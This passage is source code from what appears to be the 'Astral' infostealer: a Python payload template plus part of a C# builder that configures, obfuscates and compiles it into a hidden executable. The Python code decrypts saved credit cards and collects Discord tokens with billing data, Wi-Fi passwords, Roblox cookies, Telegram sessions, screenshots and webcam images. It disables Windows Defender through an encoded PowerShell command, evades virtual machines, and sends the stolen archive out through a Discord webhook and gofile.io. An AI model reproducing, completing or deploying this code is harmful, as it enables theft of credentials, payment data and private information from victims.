                for res in cursor.execute(""SELECT url, title, visit_count, last_visit_time FROM urls WHERE url IS NOT NULL AND title IS NOT NULL AND visit_count IS NOT NULL AND last_visit_time IS NOT NULL"").fetchall():
                    sites.append(res)
                sites.sort(key=lambda x: x[3], reverse=True)
                self.thingstocount['historybaby'] += len(sites)
                for site in sites:
                    f.write(""Visit Count: {:<6} Title: {:<40}\n"".format(
                        site[2], site[1]))
            cursor.close()
            conn.close()
            os.remove(historyvault)
        except:
            pass

    def thiefcat_browsers5(self, name: str, path: str, profile: str):
        if self.Found_Browsers != ""yes"":
            return
        try:
            path += ""\\"" + profile + ""\\Web Data""
            if not os.path.isfile(path):
                return
            cc_vaults = self.dir_random_create()
            shutil.copy2(path, cc_vaults)
            with sqlite3.connect(cc_vaults) as conn:
                conn.row_factory = sqlite3.Row
                with conn.cursor() as cursor:
                    cursor.execute(""SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''"")
                    with open(os.path.join(self.dir, ""Browsers"", ""CC.txt""), ""a"", encoding=""utf-8"") as f:
                        for res in cursor.fetchall():
                            name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
                            f.write(f""Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n"")
                            self.thingstocount['creditcard'] += len(name_on_cc)
            os.remove(cc_vaults)
        except:
            pass
    @extract_try
    def thiefcat_GetGoogle3(self):
        if self.Found_Browsers != ""yes"":
            return
        try:
            with open(os.path.join(self.dir, ""Google"", ""History.txt""), ""w"", encoding=""cp437"", errors=""ignore"") as f:
                def NotKSCH58pleaseexctract(db_cursor):
                    db_cursor.execute(""SELECT title, url, last_visit_time FROM urls"")
                    for item in db_cursor.fetchall():
                        yield f""Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.time_convertion(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n""

                def exctract_websearch_bc(db_cursor):
                    db_cursor.execute(""SELECT term FROM keyword_search_terms"")
                    for item in db_cursor.fetchall():
                        if item[0] != """":
                            yield item[0]

                for prof in os.listdir(self.chrome_user_path):
                    if not re.match(self.rgx_chrome, prof):
                        continue
                    login_db = os.path.join(self.chrome_user_path, prof, ""History"")
                    login = self.files_creating()
                    shutil.copy2(login_db, login)
                    with sqlite3.connect(login) as conn:
                        cursor = conn.cursor()
                        search_history = exctract_websearch_bc(cursor)
                        web_history = NotKSCH58pleaseexctract(cursor)
                        f.write(f""{' ' * 17}{NotKSCH58} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"")
                        self.thingstocount['historybaby'] += sum(
                            1 for _ in search_history)
                        self.thingstocount['historybaby'] += sum(1 for _ in web_history)
                        cursor.close()
                        os.remove(login)
        except:
            pass

    def natify_matched_tokens(self):
        with open(self.dir + ""\\Discord_Info.txt"", ""w"", encoding=""cp437"", errors=""ignore"") as f:
            try:
                for token in self.hawked:
                    headers = self.header_making(token)
                    j = httpx.get(self.disc_url_api, headers=headers).json()
                    user = f""{j['username']}#{j['discriminator']}""
                    flags = j.get(""flags"", 0)
                    badge_flags = {
                    1: ""Staff"",
                    2: ""Partner"",
                    4: ""Hypesquad Event"",
                    8: ""Green Bughunter"",
                    64: ""Hypesquad Bravery"",
                    128: ""Hypesquad Brilliance"",
                    256: ""Hypesquad Balance"",
                    512: ""Early Supporter"",
                    16384: ""Gold BugHunter"",
                    131072: ""Verified Bot Developer"",
                    4194304: ""Active Developer"",
                    }
                    badges = [badge_flags[f] for f in badge_flags if flags & f]
                    if not badges:
                        badges = [""None""]
                    email = j.get(""email"", ""No Email attached"")
                    phone = j.get(""phone"", ""No Phone Number attached"")
                    try:
                        nitro_data = httpx.get(
                            self.disc_url_api + ""/billing/subscriptions"", headers=headers
                              ).json()
                        has_nitro = bool(nitro_data)
                    except:
                       pass
                    time.sleep(0.5)
                    try:
                        payment_sources = json.loads(
                            httpx.get(
                            self.disc_url_api + ""/billing/payment-sources"", headers=headers
                            ).text
                            )
                    except:
                        pass
                    billing = bool(payment_sources)
                    f.write(
                        f""{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n""
                    )
                    self.thingstocount['info_discord'] += 1
            except:
                pass

    def thiefcat_GetMinecraft(self) -> None:
        if self.Found_Game != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Games"", ""Minecraft"")
            mcdir = os.path.join(self.roaming, "".minecraft"")
            if not os.path.exists(mcdir) or not os.path.isfile(os.path.join(mcdir, ""launcher_profiles.json"")):
                return
            count = 0
            os.makedirs(directory, exist_ok=True)
            for i in os.listdir(mcdir):
                if i.endswith(("".json"", "".txt"", "".dat"")):
                    shutil.copy2(os.path.join(mcdir, i), os.path.join(directory, i))
                    count += 1
            self.thingstocount[""friendlybabymc""] += count
        except:
            pass

    def thiefcat_GetClipboard(self):
        if self.Found_Clipboard != ""yes"":
            return
        try:
            output = Functions.NotKSCH58findClipboard()
            if output:
                with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(
                        f""{NotKSCH58} | https://github.com/freeman649/{NotKSCH58}\n\n"" + output)
        except:
            pass
                
    def thiefcat_GetAllUSB(self):
        if self.Found_Sys != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Systeme"")
            os.makedirs(directory, exist_ok=True)
            output = Functions.NotKSCH58findDevices()
            if output:
                with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(
                    f""{NotKSCH58} | https://github.com/freeman649/{NotKSCH58}\n\n"" + output)
        except Exception:
            return None
        

    def thiefcat_GetAntiVirus(self):
        if self.Found_AV != ""yes"":
            return
        try:
            cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName'
            with Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) as proc:
                output, error = proc.communicate()
                if proc.returncode != 0:
                    return
                output_lines = output.strip().split(""\n"")
                if len(output_lines) < 2:
                    return
                av_list = output_lines[1:]
                av_path = os.path.join(self.dir, ""Systeme"", ""Anti Virus.txt"")
                with open(av_path, ""w"", encoding=""utf-8"", errors=""ignore"") as f:
                    f.write(""\n"".join(av_list))
        except:
            pass

    def thiefcat_DisableDefender(self):
        if self.disablemydefender != ""yes"":
            return
        try:
            cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode()
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            pass

    @extract_try
    def thiefcat_GetWifi(self):
        if self.Found_Wifi != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Systeme"")
            os.makedirs(directory, exist_ok=True)
            passwords = Functions.NotKSCH58findwifi()
            profiles = [
                f'SSID: {ssid}\n{NotKSCH58}  PASSW:{password}' for ssid, password in passwords.items()]
            divider = f'\n\n{NotKSCH58} | https://github.com/freeman649/{NotKSCH58}\n\n'

            with open(os.path.join(self.dir, 'Systeme', 'Wifi Info.txt'), ""w"", encoding='utf-8', errors='ignore') as file:
                file.write(divider + divider.join(profiles))
            self.thingstocount['wifinet'] += len(profiles)
        except:
            pass

    def thiefcat_TelegramSessions(self):
        if self.Found_Telegram == ""yes"":
            return
        telegram_paths = []
        login_paths = []
        files = []
        has_key_datas = False

        process = subprocess.run(""reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"", shell=True, capture_output=True)
        if process.returncode == 0:
            paths = [x for x in process.stdout.decode(errors=""ignore"").splitlines() if x.strip()]
            for path in paths:
                process = subprocess.run('reg query ""{}"" /v DisplayIcon'.format(path), shell=True, capture_output=True)
                if process.returncode == 0:
                    path = process.stdout.strip().decode(errors=""ignore"").split("" "" * 4)[-1].split("","")[0]
                    if ""telegram"" in path.lower():
                        telegram_paths.append(os.path.dirname(path))
        if not telegram_paths:
            telegram_paths.append(os.path.join(os.getenv('Roaming'), ""Telegram Desktop""))  # Corrected variable name and added os.getenv('APPDATA')
        for path in telegram_paths:
            path = os.path.join(path, ""tdata"")
            if os.path.isdir(path):
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if item == ""key_datas"":
                        has_key_datas = True
                        login_paths.append(item_path)

                    if os.path.isfile(item_path):
                        files.append(item_path)  # Corrected appending of files
                    else:
                        login_paths.extend([os.path.join(item_path, x) for x in os.listdir(item_path)])
        if has_key_datas and len(login_paths) > 0:  # Corrected the condition
            save_to_dir = os.path.join(self.dir, ""Telegram"")
            os.makedirs(save_to_dir, exist_ok=True)
            with open(os.path.join(self.dir, ""Telegram""), ""w"") as f:
                try:
                    shutil.copy2(path, os.path.join(save_to_dir, os.path.basename(path)))
                except Exception:
                    shutil.rmtree(save_to_dir)
                    return

    def thiefcat_GetRoblox(self):
        if self.Found_Roblox != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Games"", ""Roblox"")
            def subproc(path):
                try:
                    return (
                        subprocess.check_output(
                            rf""powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY"",
                            creationflags=0x08000000,
                        )
                        .decode()
                        .rstrip()
                    )
                except Exception:
                    return None

            regex_c00ks = subproc(r""HKLM"") or subproc(r""HKCU"")
            if regex_c00ks:
                self.rblxcckcs.append(regex_c00ks)
            if self.rblxcckcs:
                os.makedirs(directory, exist_ok=True)
                with open(os.path.join(self.dir, ""Games"",""Roblox"", f""Roblox_{justaterm}.txt""), ""w"") as f:
                    f.write(""\n"".join(self.rblxcckcs))
        except:
            pass
#Modified by xTyzenIV And le_chat_blanc999

    async def Upload_Path(self, filename, path):
        if os.path.isfile(path):
            with open(path, ""rb"") as file:
                fileBytes = file.read()

            if filename is None:
                filename = os.path.basename(path)

            try:
                server_response = requests.get(""https://api.gofile.io/getServer"")
                server = server_response.json()[""data""][""server""]
                if server:
                    upload_url = ""https://{}.gofile.io/uploadFile"".format(server)
                    upload_fields = {""file"": (filename, fileBytes)}
                    upload_response = requests.post(upload_url, files=upload_fields)
                    url = upload_response.json()[""data""][""downloadPage""]
                    self.thezip_url = url
                    if url:
                        return url
            except Exception as e:
                    return None


    def thiefcat_TakeCamera(self):
        if self.Found_Screen != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Systeme"")
            os.makedirs(directory, exist_ok=True)
            camera = cv2.VideoCapture(0)
            result, image = camera.read()
            if result:
                cv2.imwrite(self.dir + f""\\Systeme\\Cam.png"",image)
                self.thingstocount['screenshotbro'] += 1
            else:
                pass
        except:
            pass

    def thiefcat_TakeScreenshot(self):
        if self.Found_Screen != ""yes"":
                return
        try:
            directory = os.path.join(self.dir, ""Systeme"")
            os.makedirs(directory, exist_ok=True) 
            try:
                screen_width = win32api.GetSystemMetrics(0)
                screen_height = win32api.GetSystemMetrics(1)
                image = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
                image.save(self.dir + f""\\Systeme\\Screenshot.png"")
            except Exception as e:
                pass
        except Exception as e:
                pass
        

    def thiefcat_GetSysInfo(self):
        if self.Found_Sys != ""yes"":
            return
        try:
            directory = os.path.join(self.dir, ""Systeme"")
            about = [
                f""{imthebestdev} | {spoted_victim}"",
                f""Windows Key: {self.windowfoundkey}"",
                f""Windows Version: {self.never_wind}"",
                f""Ram Storage: {self.fastmem_stored}GB"",
                f""Disk Storage: {space_stored}GB"",
                f""Hwid: {self.window_wid}"",
                f""IP: {self.ip}"",
                f""City: {self.city}"",
                f""Country: {self.country}"",
                f""Region: {self.region}"",
                f""Org: {self.org}"",
                f""GoogleMaps: {self.googlemap}"",
                f""Lang: {self.pc_codewinl}""
            ]
            os.makedirs(directory, exist_ok=True)
            with open(os.path.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write('\n'.join(about))
        except:
            pass

    #Modified by xTyzenIV And le_chat_blanc999
    async def finished_bc(self):
        try:
            for i in os.listdir(self.dir):
                if i.endswith("".txt""):
                    path = self.dir + self.sep + i
                    with open(path, ""r"", errors=""ignore"") as ff:
                        x = ff.read()
                        if not x:
                            ff.close()
                            os.remove(path)
                        else:
                            with open(path, ""w"", encoding=""utf-8"", errors=""ignore"") as f:
                                f.write(
                                    f""{NotKSCH58} Create By freeman649 | https://github.com/freeman649\n\n""
                                )
                            with open(path, ""a"", encoding=""utf-8"", errors=""ignore"") as fp:
                                fp.write(
                                    x
                                    + f""\n\n{NotKSCH58} Create By freeman649 | https://github.com/freeman649""
                                )
            _zipfile = os.path.join(
                self.appdata, f""{self.getlange(self.pc_codewinl)}ASTRAL[{imthebestdev}].zip"")
            zipped_file = zipfile.ZipFile(_zipfile, ""w"", zipfile.ZIP_DEFLATED)
            path_src = os.path.abspath(self.dir)
            for dirname, _, files in os.walk(self.dir):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(path_src) + 1:]
                    zipped_file.write(absname, arcname)
            zipped_file.close()
                
            file_count, files_found, tokens = 0, """", """"
            for _, __, files in os.walk(self.dir):
                for _file in files:
                    if file_count < 10: 
                        files_found += f""{_file}\n""
                        file_count += 1
            for i, tkn in enumerate(self.hawked):
                if i >= 3:
                    break
                tokens += f""{tkn}\n\n""
            fileCount = f""{file_count} {NotKSCH58} FILES: ""
            file_list = files_found.strip().split('\n')
            formatted_files_found = ''
            counter = 0
            for i in range(0, len(file_list), 2):
                file1 = file_list[i]
                if i + 1 < len(file_list):
                    file2 = file_list[i + 1]
                else:
                    file2 = """"
                if len(file1) > 17 or len(file2) > 17:
                    counter += 1
                    continue
                formatted_file1 = file1.ljust(20, ""\u2009"") 
                formatted_file2 = file2.ljust(20, ""\u2009"")
                formatted_files_found += f""- {formatted_file1} - {formatted_file2}\n""
            if counter > 0:
                formatted_files_found += f""\n+ {counter} files\n""
#Modified by xTyzenIV And le_chat_blanc999
            embed = {
                ""username"": f""{NotKSCH58}"",
                ""avatar_url"": f""https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png"",
                ""embeds"": [
                    {
                        ""author"": {
                            ""name"": f""{NotKSCH58} v1 "",
                            ""url"": f""https://github.com/freeman649"",
                            ""icon_url"": f""https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png"",
                        },
                        ""color"": 4873727,
                        ""description"": f""{NotKSCH58} ON TOP"",
                        ""fields"": [
                            {
                                ""name"": ""\u200b"",
                                ""value"": f""""""```ansi
IP: {self.ip if self.ip else ""N/A""}
Org: {self.org if self.org else ""N/A""}
City: {self.city if self.city else ""N/A""}
Region: {self.region if self.region else ""N/A""}
Country: {self.country if self.country else ""N/A""} 
```
                                """""".replace(
                                    "" "", "" ""
                                ),
                                ""inline"": False,
                            },
                            {
                                ""name"": ""\u200b"",
                                ""value"": f""""""```markdown
# Computer Name: {spoted_victim.replace("" "", "" "")}
# Windows Key: {self.windowfoundkey.replace("" "", "" "")}
# Windows Ver: {self.never_wind.replace("" "", "" "")}
# Ram Stockage: {self.fastmem_stored}GB
# Disk Stockage: {space_stored}GB
# Total Disk Storage: {self.total_gb:.2f}GB
# Used {self.used_gb:.2f}GB
# Free: {self.free_gb:.2f}GB```
                                """""".replace(
                                    "" "", """"
                                ),
                                ""inline"": True,
                            },
                            {
                                ""name"": ""\u200b"",
                                ""value"": f""""""```markdown
# {justaterm}Found: {self.thingstocount[f'{justatermlil}']}
# Passwords Found: {self.thingstocount['passwrd']}
# Credit Card Found: {self.thingstocount['creditcard']}
# Wifi Passwords Found: {self.thingstocount['wifinet']}
# Bookmarks Found: {self.thingstocount['bookmarksbaby']}
# History Found: {self.thingstocount['historybaby']}
# Minecraft Tokens Found: {self.thingstocount['friendlybabymc']}
# Discord Tokens Found: {self.thingstocount['info_discord']}
# Roblox {justaterm} Found: {self.thingstocount['roblox_friendly']}```
                                """""".replace(
                                    "" "", """"
                                ),
                                ""inline"": True,
                            },
                            {
                                ""name"": ""\u200b"",
                                ""value"": f""""""```yaml
Disk Used at:
{self.progress_bar} {self.used_percent:.2f}
                                    ```
                                """""".replace(
                                    "" "", """"
                                ),
                                ""inline"": False,
                            },
                            {
                                ""name"": fileCount,
                                ""value"": f""""""```markdown
                                    {formatted_files_found.replace('_', ' ')}
                                    ```
                                """""".replace(
                                    "" "", """"
                                ),
                                ""inline"": False,
                            },
                            {
                                ""name"": ""**- Valid Tokens Found:**"",
                                ""value"": f""""""```yaml
{tokens[:2000] if tokens else ""tokens not found""}```
        """""".replace("" "", """"),
                                
                                ""inline"": False,
                            },

                        ],
                        ""footer"": {
                            ""text"": f""{NotKSCH58} Create BY freeman649""
                        },
                    }
                ],
            }
            try:
                httpx.post(self.thishawk_webh, json=embed)
                link = await self.Upload_Path(f""{self.getlange(self.pc_codewinl)}ASTRAL_{imthebestdev}.zip"", _zipfile)
                file_size = os.path.getsize(_zipfile)
                if file_size > 8 * 1024 * 1024:
                    embed2 = {
                        ""username"": f""{NotKSCH58}"",
                        ""avatar_url"": f""https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png"",
                        ""embeds"": [
                    {
                        ""author"": {
                            ""name"": f""{NotKSCH58} v1 "",
                            ""url"": f""https://github.com/{NotKSCH58}"",
                            ""icon_url"": f""https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png"",
                        },
                        ""color"": 4873727,
                        ""description"": f""So Big For Discord Your Link is : {link}"",
                        ""footer"": {
                            ""text"": f""{NotKSCH58} Create BY freeman649・https://github.com/freeman649""
                        },
                    }
                ],
            }
                    httpx.post(self.thishawk_webh, json=embed2)
                else:
                    with open(_zipfile, ""rb"") as f:
                        if self.webapi_find in self.thishawk_webh:
                            httpx.post(self.thishawk_webh,files={""upload_file"": f}) 
                            time.sleep(1)
            except:
                pass
            finally:
                try:
                    f.close()
                    zipped_file.close()
                    _zipfile.close()
                except:
                    pass
                try:
                    os.remove(_zipfile)
                except:
                    pass
        except:
            pass

class AntiDebugg(Functions):
    inVM = False
    def __init__(self):
        def fetch_blocked_programs(url):
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                return data
            else:
                pass 
        
        self.processes = list()

        blocked_prog = ""https://raw.githubusercontent.com/meccksch/cerf/main/assets/blocked_progr.json""
        blocked_pcname = ""https://raw.githubusercontent.com/meccksch/cerf/main/assets/blockedpcname.json""
        blocked_hwid = ""https://raw.githubusercontent.com/meccksch/cerf/main/assets/blocked_hwid.json""
        blocked_ips = ""https://raw.githubusercontent.com/meccksch/cerf/main/assets/blocked_ips.json""
        self.users_blocked = fetch_blocked_programs(blocked_prog)
        self.pcname_blocked = fetch_blocked_programs(blocked_pcname)
        self.hwid_blocked = fetch_blocked_programs(blocked_hwid)
        self.ips_blocked =fetch_blocked_programs(blocked_ips)

        for func in [self.last_check, self.keys_regex, self.Check_and_Spec]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def last_check(self):
        blocked_paths = [r""D:\Tools"", r""D:\OS2"", r""D:\NT3X""]
        blocked_users = set(self.users_blocked)
        blocked_pcnames = set(self.pcname_blocked)
        blocked_ips = set(self.ips_blocked)
        blocked_hwids = set(self.hwid_blocked)

        if any(os.path.exists(path) for path in blocked_paths):
            self.programExit()
        if imthebestdev in blocked_users:
            self.programExit()
        if spoted_victim in blocked_pcnames:
            self.programExit()
        if self.info_netword()[0] in blocked_ips:
            self.programExit()
        if self.info_sys()[0] in blocked_hwids:
            self.programExit()

    def Check_and_Spec(self):
        memorystorage = int(fastmem_stored)
        storagespace = int(space_stored)
        cpu_count = psutil.cpu_count()
        if memorystorage <= 2 or storagespace <= 100 or cpu_count <= 1:
            self.programExit()

    def keys_regex(self):
        reg1 = os.system(
            ""REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul""
        )
        reg2 = os.system(
            ""REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul""
        )
        if (reg1 and reg2) != 1:
            self.programExit()
        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, ""SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum""
        )
        try:
            reg_val = winreg.QueryValueEx(handle, ""0"")[0]
            if (""VMware"" or ""VBOX"") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)

if __name__ == ""__main__"" and os.name == ""nt"":
    asyncio.run(NotKSCH58_first_funct().init())
    autoo = threading.Thread(target=Replacer_Loop().run)
    autoo.start()";

        public Form1()
        {
            InitializeComponent();
        }

        private void GenerateCustomPythonScript()
        {
            try
            {
                string baseFileName = ExeNameOutput.Text;
                string pythonCode = pythonCodeTemplate;

                pythonCode = ReplaceOptionValue(pythonCode, "PC_CREATOR", Environment.UserName);
                pythonCode = ReplaceOptionValue(pythonCode, "API_LINK", "");
                pythonCode = ReplaceOptionValue(pythonCode, "B64_WBH_STR", B64_WBH_STR.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "_GetBrowsers_Options", _GetBrowsers_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "AntiVirus_Options", AntiVirus_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "_Games_Options", _Games_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Sys_Options", Sys_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Roblox_Options", Roblox_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Screen_Options", Screen_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "ClipBoard_Options", ClipBoard_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Wifi_Options", Wifi_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Hide_Options", Hide_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "KillDiscord_Options", KillDiscord_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "_error_thiefcat", _error_thiefcat.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Startup_Options", Startup_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "InjectBrowsers_Options", InjectBrowsers_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Telegram_Options", Telegram_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Debugger_Options", Debugger_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Disable_Defender_Options", Disable_Defender_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "InjectDiscord_Options", InjectDiscord_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "ADA_address_Options", ADA_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "CryptoReplacer_Options", CryptoReplacer_Options.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "BTC_address_Options", BTC_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "DASH_address_Options", DASH_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "_ETH_address_Options", _ETH_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "_XCHAIN_address_Options", _XCHAIN_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "PACHAIN_address_Options", PACHAIN_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "CCHAIN_address_Options", CCHAIN_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "MONERO_address_Options", MONERO_address_Options.Text);
                pythonCode = ReplaceOptionValue(pythonCode, "_Found_Launcher", _Found_Launcher.Checked ? "yes" : "no");
                pythonCode = ReplaceOptionValue(pythonCode, "Crypto_Options", Crypto_Options.Checked ? "yes" : "no");

                File.WriteAllText($"{baseFileName}.py", pythonCode);

                // Si la case à cocher encryption est cochée, exécuter la commande d'obfuscation
                if (encryption.Checked)
                {
                    string obfuscatedFilePath = $"{baseFileName}_obfuscated.py"; // Renommer le fichier de sortie

                    // Exécuter la commande Python d'obfuscation avec ProcessStartInfo
                    ProcessStartInfo psiEncrypt = new ProcessStartInfo
                    {
                        FileName = "python",
                        Arguments = $"./Astral_assets/obfuscation/obfuscation.py -r -i {baseFileName}.py -o {obfuscatedFilePath} -s 100",
                        UseShellExecute = false,
                        CreateNoWindow = false
                    };

                    using (Process processEncrypt = Process.Start(psiEncrypt))
                    {
                        processEncrypt.WaitForExit();
                    }

                    // Utiliser le fichier obfuscé pour la compilation
                    baseFileName = $"{baseFileName}_obfuscated";
                }

                // Si la case à cocher compil est cochée, exécuter la commande de compilation
                if (compil.Checked)
                {
                    string hideOption = "";
                    string icon = LinkToIcon.Text; // Utiliser le lien vers l'icône entré dans le champ de texte

                    // Définir les options en fonction de l'état des cases à cocher
                    if (Hide_Options.Checked)
                    {
                        hideOption = "--noconsole";
                    }

                    // Exécuter la commande de compilation
                    string command = $"pyinstaller --onefile --name {baseFileName} --version-file=./Astral_assets/version/version.txt {hideOption} -i \"{icon}\" {baseFileName}.py";

                    // Exécuter la commande avec ProcessStartInfo
                    ProcessStartInfo psiCompile = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        UseShellExecute = false,
                        CreateNoWindow = false
                    };

                    using (Process processCompile = Process.Start(psiCompile))
                    {
                        processCompile.WaitForExit();
                    }

                    MessageBox.Show("Compilation completed successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                MessageBox.Show("Python script generated successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error generating Python script: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Méthode pour remplacer une valeur dans le template de code Python
        private string ReplaceOptionValue(string template, string option, string value)
        {
            return template.Replace($"{{{{ {option} }}}}", value);
        }

        private void build_script_Click(object sender, EventArgs e)
        {
            GenerateCustomPythonScript();

        }

        private void KillDiscord_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = KillDiscord_Options.Checked ? "yes" : "no";
            UpdatePythonCode("killdiscord_config", value);
        }

        private void Debugger_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Debugger_Options.Checked ? "yes" : "no";
            UpdatePythonCode("SAEZRTYRES1", value);
        }

        private void Disable_Defender_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Disable_Defender_Options.Checked ? "yes" : "no";
            UpdatePythonCode("AEAZAKG55", value);
        }

        private void InjectDiscord_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = InjectDiscord_Options.Checked ? "yes" : "no";
            UpdatePythonCode("AEZRETRYY5", value);
        }

        // Événements pour les champs de texte
        private void BTC_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("A8666ACLLLL", BTC_address_Options.Text);
        }

        private void _ETH_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("LOA444KVDSO", _ETH_address_Options.Text);
        }

        private void _XCHAIN_address_Options_TextChanged(object sender, EventArgs e)
        {
